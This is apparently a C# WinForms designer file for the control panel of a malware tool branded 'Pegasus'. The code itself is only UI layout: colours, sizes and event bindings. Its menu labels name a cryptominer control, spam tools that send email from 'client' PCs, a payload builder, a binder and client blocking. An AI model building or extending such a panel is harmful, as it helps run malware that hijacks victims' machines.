            this.MinerstopToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.MinerstopToolStripMenuItem1.ForeColor = System.Drawing.Color.LightGray;
            this.MinerstopToolStripMenuItem1.Name = "MinerstopToolStripMenuItem1";
            this.MinerstopToolStripMenuItem1.Size = new System.Drawing.Size(110, 24);
            this.MinerstopToolStripMenuItem1.Text = "Stop";
            this.MinerstopToolStripMenuItem1.Click += new System.EventHandler(this.MinerstopToolStripMenuItem1_Click);
            // 
            // spamToolsToolStripMenuItem
            // 
            this.spamToolsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sendEmailFromClientPCToolStripMenuItem,
            this.webHookSpammerToolStripMenuItem,
            this.chatSpammerToolStripMenuItem});
            this.spamToolsToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.spamToolsToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("spamToolsToolStripMenuItem.Image")));
            this.spamToolsToolStripMenuItem.Name = "spamToolsToolStripMenuItem";
            this.spamToolsToolStripMenuItem.Size = new System.Drawing.Size(353, 36);
            this.spamToolsToolStripMenuItem.Text = "      [Spam Tools]";
            // 
            // sendEmailFromClientPCToolStripMenuItem
            // 
            this.sendEmailFromClientPCToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.sendEmailFromClientPCToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.sendEmailFromClientPCToolStripMenuItem.Name = "sendEmailFromClientPCToolStripMenuItem";
            this.sendEmailFromClientPCToolStripMenuItem.Size = new System.Drawing.Size(265, 24);
            this.sendEmailFromClientPCToolStripMenuItem.Text = "Send Email From Client PC";
            this.sendEmailFromClientPCToolStripMenuItem.Visible = false;
            this.sendEmailFromClientPCToolStripMenuItem.Click += new System.EventHandler(this.sendEmailFromClientPCToolStripMenuItem_Click);
            // 
            // webHookSpammerToolStripMenuItem
            // 
            this.webHookSpammerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.webHookSpammerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startToolStripMenuItem2,
            this.stopToolStripMenuItem5});
            this.webHookSpammerToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.webHookSpammerToolStripMenuItem.Name = "webHookSpammerToolStripMenuItem";
            this.webHookSpammerToolStripMenuItem.Size = new System.Drawing.Size(265, 24);
            this.webHookSpammerToolStripMenuItem.Text = "WebHook Spammer";
            // 
            // startToolStripMenuItem2
            // 
            this.startToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.startToolStripMenuItem2.ForeColor = System.Drawing.Color.LightGray;
            this.startToolStripMenuItem2.Name = "startToolStripMenuItem2";
            this.startToolStripMenuItem2.Size = new System.Drawing.Size(114, 24);
            this.startToolStripMenuItem2.Text = "Send";
            this.startToolStripMenuItem2.Click += new System.EventHandler(this.startToolStripMenuItem2_Click_1);
            // 
            // stopToolStripMenuItem5
            // 
            this.stopToolStripMenuItem5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.stopToolStripMenuItem5.ForeColor = System.Drawing.Color.LightGray;
            this.stopToolStripMenuItem5.Name = "stopToolStripMenuItem5";
            this.stopToolStripMenuItem5.Size = new System.Drawing.Size(114, 24);
            this.stopToolStripMenuItem5.Text = "Stop";
            this.stopToolStripMenuItem5.Visible = false;
            this.stopToolStripMenuItem5.Click += new System.EventHandler(this.stopToolStripMenuItem5_Click);
            // 
            // chatSpammerToolStripMenuItem
            // 
            this.chatSpammerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.chatSpammerToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.chatSpammerToolStripMenuItem.Name = "chatSpammerToolStripMenuItem";
            this.chatSpammerToolStripMenuItem.Size = new System.Drawing.Size(265, 24);
            this.chatSpammerToolStripMenuItem.Text = "Chat Spammer";
            this.chatSpammerToolStripMenuItem.Visible = false;
            this.chatSpammerToolStripMenuItem.Click += new System.EventHandler(this.chatSpammerToolStripMenuItem_Click);
            // 
            // toolStripMenuItem57
            // 
            this.toolStripMenuItem57.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem60,
            this.toolStripMenuItem59,
            this.pEGASUSBUILDERToolStripMenuItem,
            this.sKYNETSHOPToolStripMenuItem,
            this.openSupportTicketToolStripMenuItem});
            this.toolStripMenuItem57.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem57.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem57.Image")));
            this.toolStripMenuItem57.ImageTransparentColor = System.Drawing.Color.Transparent;
            this.toolStripMenuItem57.Name = "toolStripMenuItem57";
            this.toolStripMenuItem57.Size = new System.Drawing.Size(353, 36);
            this.toolStripMenuItem57.Text = "      [PEGASUS]";
            this.toolStripMenuItem57.Click += new System.EventHandler(this.builderToolStripMenuItem1_Click_1);
            // 
            // toolStripMenuItem60
            // 
            this.toolStripMenuItem60.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem60.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem60.ImageTransparentColor = System.Drawing.Color.Transparent;
            this.toolStripMenuItem60.Name = "toolStripMenuItem60";
            this.toolStripMenuItem60.Size = new System.Drawing.Size(243, 24);
            this.toolStripMenuItem60.Text = "License Status/Update";
            this.toolStripMenuItem60.Visible = false;
        
            // 
            // toolStripMenuItem59
            // 
            this.toolStripMenuItem59.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.toolStripMenuItem59.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem59.ImageTransparentColor = System.Drawing.Color.Transparent;
            this.toolStripMenuItem59.Name = "toolStripMenuItem59";
            this.toolStripMenuItem59.Size = new System.Drawing.Size(243, 24);
            this.toolStripMenuItem59.Text = "Video/Documentation";
            this.toolStripMenuItem59.Click += new System.EventHandler(this.toolStripMenuItem59_Click);
            // 
            // pEGASUSBUILDERToolStripMenuItem
            // 
            this.pEGASUSBUILDERToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.pEGASUSBUILDERToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.pEGASUSBUILDERToolStripMenuItem.Name = "pEGASUSBUILDERToolStripMenuItem";
            this.pEGASUSBUILDERToolStripMenuItem.Size = new System.Drawing.Size(243, 24);
            this.pEGASUSBUILDERToolStripMenuItem.Text = "Pegasus Builder";
            this.pEGASUSBUILDERToolStripMenuItem.Click += new System.EventHandler(this.builderToolStripMenuItem1_Click_1);
            // 
            // sKYNETSHOPToolStripMenuItem
            // 
            this.sKYNETSHOPToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.sKYNETSHOPToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.sKYNETSHOPToolStripMenuItem.Name = "sKYNETSHOPToolStripMenuItem";
            this.sKYNETSHOPToolStripMenuItem.Size = new System.Drawing.Size(243, 24);
            this.sKYNETSHOPToolStripMenuItem.Text = "Pantheon Shop";
            this.sKYNETSHOPToolStripMenuItem.Click += new System.EventHandler(this.sKYNETSHOPToolStripMenuItem_Click);
            // 
            // openSupportTicketToolStripMenuItem
            // 
            this.openSupportTicketToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.openSupportTicketToolStripMenuItem.ForeColor = System.Drawing.Color.LightGray;
            this.openSupportTicketToolStripMenuItem.Name = "openSupportTicketToolStripMenuItem";
            this.openSupportTicketToolStripMenuItem.Size = new System.Drawing.Size(243, 24);
            this.openSupportTicketToolStripMenuItem.Text = "Open Support Ticket";
            this.openSupportTicketToolStripMenuItem.Click += new System.EventHandler(this.openSupportTicketToolStripMenuItem_Click);
            // 
            // toolStripMenuItem58
            // 
            this.toolStripMenuItem58.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem58.ImageTransparentColor = System.Drawing.Color.Transparent;
            this.toolStripMenuItem58.Name = "toolStripMenuItem58";
            this.toolStripMenuItem58.Size = new System.Drawing.Size(353, 36);
            this.toolStripMenuItem58.Text = "    Block Clients";
            this.toolStripMenuItem58.Visible = false;
            this.toolStripMenuItem58.Click += new System.EventHandler(this.BlockToolStripMenuItem_Click);
            // 
            // LISTVIEWTASKS
            // 
            this.LISTVIEWTASKS.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.LISTVIEWTASKS.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.LISTVIEWTASKS.Controls.Add(this.guna2VScrollBar3);
            this.LISTVIEWTASKS.Controls.Add(this.guna2VScrollBar2);
            this.LISTVIEWTASKS.Controls.Add(this.guna2PictureBox1);
            this.LISTVIEWTASKS.Controls.Add(this.listView2);
            this.LISTVIEWTASKS.Controls.Add(this.listView4);
            this.LISTVIEWTASKS.Controls.Add(this.guna2VSeparator4);
            this.LISTVIEWTASKS.Controls.Add(this.guna2VSeparator5);
            this.loadForm.SetDecoration(this.LISTVIEWTASKS, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.LISTVIEWTASKS, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.LISTVIEWTASKS, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.LISTVIEWTASKS, Guna.UI2.AnimatorNS.DecorationType.None);
            this.LISTVIEWTASKS.Dock = System.Windows.Forms.DockStyle.Fill;
            this.LISTVIEWTASKS.Font = new System.Drawing.Font("Electrolize", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.LISTVIEWTASKS.Location = new System.Drawing.Point(3, 3);
            this.LISTVIEWTASKS.Name = "LISTVIEWTASKS";
            this.LISTVIEWTASKS.Size = new System.Drawing.Size(1545, 747);
            this.LISTVIEWTASKS.TabIndex = 7;
            // 
            // guna2VScrollBar3
            // 
            this.guna2VScrollBar3.BindingContainer = this.listView2;
            this.guna2VScrollBar3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2Transition2.SetDecoration(this.guna2VScrollBar3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VScrollBar3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2VScrollBar3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2VScrollBar3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VScrollBar3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar3.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2VScrollBar3.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar3.HoverState.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar3.InUpdate = false;
            this.guna2VScrollBar3.LargeChange = 10;
            this.guna2VScrollBar3.Location = new System.Drawing.Point(1527, 0);
            this.guna2VScrollBar3.Name = "guna2VScrollBar3";
            this.guna2VScrollBar3.PressedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2VScrollBar3.PressedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar3.PressedState.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar3.ScrollbarSize = 18;
            this.guna2VScrollBar3.Size = new System.Drawing.Size(18, 747);
            this.guna2VScrollBar3.TabIndex = 22;
            this.guna2VScrollBar3.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar3.ThumbStyle = Guna.UI2.WinForms.Enums.ThumbStyle.Inset;
            // 
            // guna2VScrollBar2
            // 
            this.guna2VScrollBar2.BindingContainer = this.listView4;
            this.guna2VScrollBar2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2Transition2.SetDecoration(this.guna2VScrollBar2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VScrollBar2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2VScrollBar2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2VScrollBar2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VScrollBar2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar2.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2VScrollBar2.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar2.HoverState.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar2.InUpdate = false;
            this.guna2VScrollBar2.LargeChange = 10;
            this.guna2VScrollBar2.Location = new System.Drawing.Point(580, 0);
            this.guna2VScrollBar2.Name = "guna2VScrollBar2";
            this.guna2VScrollBar2.PressedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2VScrollBar2.PressedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar2.PressedState.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar2.ScrollbarSize = 18;
            this.guna2VScrollBar2.Size = new System.Drawing.Size(18, 747);
            this.guna2VScrollBar2.TabIndex = 21;
            this.guna2VScrollBar2.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar2.ThumbStyle = Guna.UI2.WinForms.Enums.ThumbStyle.Inset;
            // 
            // guna2PictureBox1
            // 
            this.guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2PictureBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox1.Dock = System.Windows.Forms.DockStyle.Top;
            this.guna2PictureBox1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2PictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox1.Image")));
            this.guna2PictureBox1.ImageRotate = 0F;
            this.guna2PictureBox1.Location = new System.Drawing.Point(598, 0);
            this.guna2PictureBox1.Name = "guna2PictureBox1";
            this.guna2PictureBox1.Size = new System.Drawing.Size(370, 45);
            this.guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox1.TabIndex = 23;
            this.guna2PictureBox1.TabStop = false;
            // 
            // guna2VSeparator4
            // 
            this.guna2VSeparator4.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.loadForm.SetDecoration(this.guna2VSeparator4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2VSeparator4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VSeparator4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2VSeparator4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VSeparator4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VSeparator4.Location = new System.Drawing.Point(961, -1);
            this.guna2VSeparator4.Name = "guna2VSeparator4";
            this.guna2VSeparator4.Size = new System.Drawing.Size(10, 745);
            this.guna2VSeparator4.TabIndex = 25;
            // 
            // guna2VSeparator5
            // 
            this.guna2VSeparator5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left)));
            this.loadForm.SetDecoration(this.guna2VSeparator5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2VSeparator5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VSeparator5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2VSeparator5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VSeparator5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VSeparator5.Location = new System.Drawing.Point(593, -1);
            this.guna2VSeparator5.Name = "guna2VSeparator5";
            this.guna2VSeparator5.Size = new System.Drawing.Size(10, 745);
            this.guna2VSeparator5.TabIndex = 26;
            // 
            // panel2
            // 
            this.panel2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.loadForm.SetDecoration(this.panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.panel2.Location = new System.Drawing.Point(1503, 257);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(130, 11);
            this.panel2.TabIndex = 8;
            this.panel2.Visible = false;
            // 
            // panel3
            // 
            this.panel3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.loadForm.SetDecoration(this.panel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.panel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.panel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.panel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.panel3.Location = new System.Drawing.Point(1503, 500);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(130, 11);
            this.panel3.TabIndex = 9;
            this.panel3.Visible = false;
            // 
            // guna2Transition1
            // 
            this.guna2Transition1.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Particles;
            this.guna2Transition1.Cursor = null;
            animation4.AnimateOnlyDifferences = true;
            animation4.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.BlindCoeff")));
            animation4.LeafCoeff = 0F;
            animation4.MaxTime = 1F;
            animation4.MinTime = 0F;
            animation4.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.MosaicCoeff")));
            animation4.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation4.MosaicShift")));
            animation4.MosaicSize = 1;
            animation4.Padding = new System.Windows.Forms.Padding(100, 50, 100, 150);
            animation4.RotateCoeff = 0F;
            animation4.RotateLimit = 0F;
            animation4.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.ScaleCoeff")));
            animation4.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.SlideCoeff")));
            animation4.TimeCoeff = 2F;
            animation4.TransparencyCoeff = 0F;
            this.guna2Transition1.DefaultAnimation = animation4;
            // 
            // guna2Panel1
            // 
            this.guna2Panel1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.guna2Panel1.Controls.Add(this.btnBinder);
            this.guna2Panel1.Controls.Add(this.guna2GradientButton5);
            this.guna2Panel1.Controls.Add(this.guna2GradientButton4);
            this.guna2Panel1.Controls.Add(this.guna2GradientButton3);
            this.guna2Panel1.Controls.Add(this.guna2GradientButton2);
            this.guna2Panel1.Controls.Add(this.guna2GradientButton1);
            this.guna2Panel1.Controls.Add(this.guna2Separator6);
            this.guna2Panel1.Controls.Add(this.guna2ControlBox1);
            this.guna2Panel1.Controls.Add(this.guna2Separator5);
            this.guna2Panel1.Controls.Add(this.guna2VSeparator2);
            this.guna2Panel1.Controls.Add(this.guna2VSeparator1);
            this.loadForm.SetDecoration(this.guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Panel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Panel1.Dock = System.Windows.Forms.DockStyle.Right;
            this.guna2Panel1.Location = new System.Drawing.Point(1559, 0);
            this.guna2Panel1.Name = "guna2Panel1";
            this.guna2Panel1.Size = new System.Drawing.Size(52, 848);
            this.guna2Panel1.TabIndex = 7;
            this.guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.guna2Panel1_MouseDown);
            // 
            // btnBinder
            // 
            this.btnBinder.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.btnBinder.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.btnBinder.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnBinder.BorderRadius = 12;
            this.btnBinder.BorderThickness = 1;
            this.btnBinder.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnBinder.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnBinder.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnBinder.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.btnBinder, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.btnBinder, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.btnBinder, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.btnBinder, Guna.UI2.AnimatorNS.DecorationType.None);
            this.btnBinder.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnBinder.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnBinder.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnBinder.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnBinder.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnBinder.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnBinder.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnBinder.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnBinder.ForeColor = System.Drawing.Color.White;
            this.btnBinder.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnBinder.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnBinder.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnBinder.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnBinder.Image = ((System.Drawing.Image)(resources.GetObject("btnBinder.Image")));
            this.btnBinder.ImageSize = new System.Drawing.Size(30, 30);
            this.btnBinder.Location = new System.Drawing.Point(6, 244);
            this.btnBinder.Name = "btnBinder";
            this.btnBinder.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnBinder.Size = new System.Drawing.Size(38, 42);
            this.btnBinder.TabIndex = 152;
            this.guna2HtmlToolTip1.SetToolTip(this.btnBinder, "Binder!");
            this.btnBinder.Click += new System.EventHandler(this.btnBinder_Click);
            // 
            // guna2GradientButton5
            // 
            this.guna2GradientButton5.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.guna2GradientButton5.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.guna2GradientButton5.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2GradientButton5.BorderRadius = 12;
            this.guna2GradientButton5.BorderThickness = 1;
            this.guna2GradientButton5.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2GradientButton5.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2GradientButton5.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2GradientButton5.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.guna2GradientButton5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2GradientButton5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2GradientButton5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2GradientButton5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2GradientButton5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton5.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton5.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
